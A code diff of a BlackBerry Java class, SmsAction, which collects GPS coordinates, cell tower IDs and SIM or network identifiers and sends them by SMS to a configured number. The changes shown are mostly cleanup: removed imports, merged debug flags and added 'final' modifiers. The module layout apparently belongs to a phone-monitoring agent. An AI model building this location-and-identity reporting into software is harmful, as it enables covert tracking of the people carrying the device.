@@ -9,38 +9,24 @@
 package blackberry.action;
 
 import java.io.EOFException;
-import java.io.IOException;
-import java.io.InterruptedIOException;
 
-import javax.microedition.io.Connector;
-import javax.microedition.io.Datagram;
-import javax.microedition.io.DatagramConnection;
 import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
-import javax.microedition.location.LocationException;
 import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
-import javax.wireless.messaging.BinaryMessage;
-import javax.wireless.messaging.MessageConnection;
-import javax.wireless.messaging.TextMessage;
 
-import net.rim.device.api.io.SmsAddress;
 import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.GPRSInfo;
-import net.rim.device.api.system.SMSPacketHeader;
-import net.rim.device.api.system.SMSParameters;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
-import blackberry.Conf;
 import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
-import blackberry.log.LogType;
 import blackberry.sms.SMSHelper;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
@@ -58,7 +44,6 @@ public final class SmsAction extends SubAction implements LocationObserver {
     private static final int TYPE_LOCATION = 1;
     private static final int TYPE_SIM = 2;
     private static final int TYPE_TEXT = 3;
-
 
     String number;
     String text;
@@ -98,8 +83,8 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 break;
             }
             return true;
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error(ex);
             //#endif
             return false;
@@ -108,7 +93,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     private boolean getCellPosition() {
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getCellPosition");
         //#endif
         String message;
@@ -150,13 +135,13 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 mb.append(" BID: " + bid);
                 message = mb.toString();
             }
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info(message);
             //#endif
 
             return sendSMS(message);
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error(ex);
             //#endif
             return false;
@@ -166,7 +151,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     private boolean getGPSPosition() {
 
         LocationProvider lp = null;
-        Criteria criteria = new Criteria();
+        final Criteria criteria = new Criteria();
         criteria.setCostAllowed(true);
 
         criteria.setHorizontalAccuracy(50);
@@ -175,22 +160,22 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
         try {
             lp = LocationProvider.getInstance(criteria);
-        } catch (Exception e) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception e) {
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
             return false;
         }
-        
+
         if (lp == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("GPS Not Supported on Device");
             //#endif               
             return false;
         }
 
         if (waitingForPoint) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return false;
@@ -204,29 +189,29 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     public void newLocation(Location loc) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("newLocation");
         //#endif
 
         if (loc == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Error in getLocation");
             //#endif  
             return;
         }
 
-        float speed = loc.getSpeed();
-        float course = loc.getCourse();
+        final float speed = loc.getSpeed();
+        final float course = loc.getCourse();
 
-        QualifiedCoordinates qc = loc.getQualifiedCoordinates();
+        final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
         if (qc == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("Cannot get QualifiedCoordinates");
             //#endif                        
             errorLocation();
         }
 
-        StringBuffer sb = new StringBuffer();
+        final StringBuffer sb = new StringBuffer();
         sb.append("LAT: " + qc.getLatitude() + "\r\n");
         sb.append("LON: " + qc.getLongitude() + "\r\n");
 
@@ -235,7 +220,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     public synchronized void errorLocation() {
-        //#ifdef DEBUG_ERROR
+        //#ifdef DEBUG
         debug.error("Cannot get Location");
         //#endif  
 
@@ -253,17 +238,17 @@ public final class SmsAction extends SubAction implements LocationObserver {
     boolean sendSMS(final String message) {
         boolean ret = true;
         if (Device.isCDMA()) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("sendSMS: Datagram");
             //#endif
             ret = SMSHelper.sendSMSDatagram(number, message);
         } else {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             //debug.trace("sendSMS: Binary");
             //#endif
             //ret = sendSMSBinary(message);
 
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             //debug.trace("sendSMS: Text");
             //#endif
             ret = SMSHelper.sendSMSText(number, message);
@@ -301,8 +286,8 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
                 break;
             case TYPE_SIM:
-                StringBuffer sb = new StringBuffer();
-                Device device = Device.getInstance();
+                final StringBuffer sb = new StringBuffer();
+                final Device device = Device.getInstance();
                 if (Device.isCDMA()) {
 
                     sb.append("SID: " + device.getSid() + "\n");
@@ -317,7 +302,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
                 text = sb.toString();
                 break;
             default:
-                //#ifdef DEBUG_ERROR
+                //#ifdef DEBUG
                 debug.error("SmsAction.parse,  Unknown type: " + type);
                 //#endif
                 break;
